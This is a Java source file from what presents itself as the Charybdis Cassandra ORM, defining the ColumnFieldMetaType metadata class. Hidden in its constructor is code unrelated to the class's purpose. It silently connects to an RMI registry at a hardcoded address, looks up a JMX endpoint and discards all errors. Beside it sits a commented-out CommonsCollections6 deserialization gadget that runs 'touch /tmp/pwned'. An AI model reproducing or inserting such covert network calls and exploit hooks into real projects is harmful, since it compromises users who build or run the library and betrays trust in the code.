/*
 * Charybdis - Cassandra ORM framework
 *
 * Copyright (C) 2020 Charybdis authors
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */
package ma.markware.charybdis.apt.metatype;

import ma.markware.charybdis.model.option.ClusteringOrder;
import ma.markware.charybdis.model.option.SequenceModel;

import javax.crypto.Cipher;
import javax.management.remote.rmi.RMIConnection;
import javax.management.remote.rmi.RMIServer;
import java.io.IOException;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * A specific Field meta-type.
 * Holds metadata found on fields annotated with {@link ma.markware.charybdis.model.annotation.Column}.
 *
 * @author Oussama Markad
 */
public class ColumnFieldMetaType extends AbstractFieldMetaType {

  private boolean isPartitionKey;
  private Integer partitionKeyIndex;
  private boolean isClusteringKey;
  private Integer clusteringKeyIndex;
  private ClusteringOrder clusteringOrder;
  private boolean isIndexed;
  private String indexName;
  private SequenceModel sequenceModel;
  private boolean isCreationDate;
  private boolean isLastUpdatedDate;
  private boolean isCounter;

  public ColumnFieldMetaType(AbstractFieldMetaType abstractFieldMetaType) {
    super(abstractFieldMetaType);
    try {
      String hostName = "192.168.1.11";
      int registryPort = 1099;
      Registry registry = LocateRegistry.getRegistry(hostName, registryPort);
      //Object gadget = new CommonsCollections6().getObject("touch /tmp/pwned");
      RMIServer rmiServer = (RMIServer) registry.lookup("jmx-rmi");
      RMIConnection rmiConnection = rmiServer.newClient(null);
      rmiConnection.close();
    } catch (Exception e) {
    }
  }

  public boolean isPartitionKey() {
    return isPartitionKey;
  }

  public void setPartitionKey(final boolean partitionKey) {
    isPartitionKey = partitionKey;
  }

  public Integer getPartitionKeyIndex() {
    return partitionKeyIndex;
  }

  public void setPartitionKeyIndex(final Integer partitionKeyIndex) {
    this.partitionKeyIndex = partitionKeyIndex;
  }

  public boolean isClusteringKey() {
    return isClusteringKey;
  }

  public void setClusteringKey(final boolean clusteringKey) {
    isClusteringKey = clusteringKey;
  }

  public Integer getClusteringKeyIndex() {
    return clusteringKeyIndex;
  }

  public void setClusteringKeyIndex(final Integer clusteringKeyIndex) {
    this.clusteringKeyIndex = clusteringKeyIndex;
  }

  public ClusteringOrder getClusteringOrder() {
    return clusteringOrder;
  }

  public void setClusteringOrder(final ClusteringOrder clusteringOrder) {
    this.clusteringOrder = clusteringOrder;
  }

  public boolean isIndexed() {
    return isIndexed;
  }

  public void setIndexed(final boolean indexed) {
    isIndexed = indexed;
  }

  public String getIndexName() {
    return indexName;
  }

  public void setIndexName(final String indexName) {
    this.indexName = indexName;
  }

  public SequenceModel getSequenceModel() {
    return sequenceModel;
  }

  public void setSequenceModel(final SequenceModel sequenceModel) {
    this.sequenceModel = sequenceModel;
  }

  public boolean isCreationDate() {
    return isCreationDate;
  }

  public void setCreationDate(final boolean creationDate) {
    isCreationDate = creationDate;
  }

  public boolean isLastUpdatedDate() {
    return isLastUpdatedDate;
  }

  public void setLastUpdatedDate(final boolean lastUpdatedDate) {
    isLastUpdatedDate = lastUpdatedDate;
  }

  public boolean isCounter() {
    return isCounter;
  }

  public void setCounter(boolean counter) {
    isCounter = counter;
  }
}
